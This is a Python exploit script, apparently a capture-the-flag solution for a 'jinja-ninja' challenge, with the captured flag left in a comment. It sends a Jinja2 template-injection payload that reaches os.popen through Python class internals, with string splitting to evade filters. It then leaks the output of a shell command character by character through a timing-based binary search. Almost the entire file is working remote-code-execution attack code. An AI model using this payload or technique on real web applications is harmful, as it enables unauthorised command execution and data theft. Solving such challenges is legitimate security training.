import requests
import math
import time
import sys


def check(cmd, ich, ch):

    template = '''
        {% for x in ().__class__.__base__.__subclasses__() %}
            {% if "warni"+"ng" in x.__name__ %}
                {% for a in range([0,1000000][x()._module.__builtins__['__imp' + 'ort__']('o'+'s').popen("'''+cmd+'''").read()['''+str(ich)+'''] < "'''+ch+'''"]) %}
                {% endfor %}
            {% endif %}
        {% endfor %}
    '''

    start = time.time()

    r = requests.post('https://jinja-ninja.secchallenge.crysys.hu/submit',data={
        "name": template,
        "email": "a",
        "faction": "4",
        "profession": "c",
        "preferences": "c",
    })
    resp = r.text
    end = time.time()

    return end - start > 0.6

def determine(cmd, ich):
    lo = 19
    hi = 127

    while hi - lo > 1:
        m = math.floor((hi + lo) / 2)

        if check(cmd, ich, chr(m)):
            hi = m
        else:
            lo = m

    if lo < 20:
        lo = ord('\n')
    sys.stdout.write(chr(lo))
    sys.stdout.flush()

#cd21{0nc3_4941n_1_54LU73_my_1mp3r470r_fUr1054_4nd_1_54lU73_mY_H4lF-l1F3_w4r_80y5_wH0_W1Ll_R1D3_W17h_M3_373RN4L_0N_73h_H19Hw4y5_0f_v4lh4ll4!}
for i in range(300, 2000):
    determine('cat requirements.txt', i)
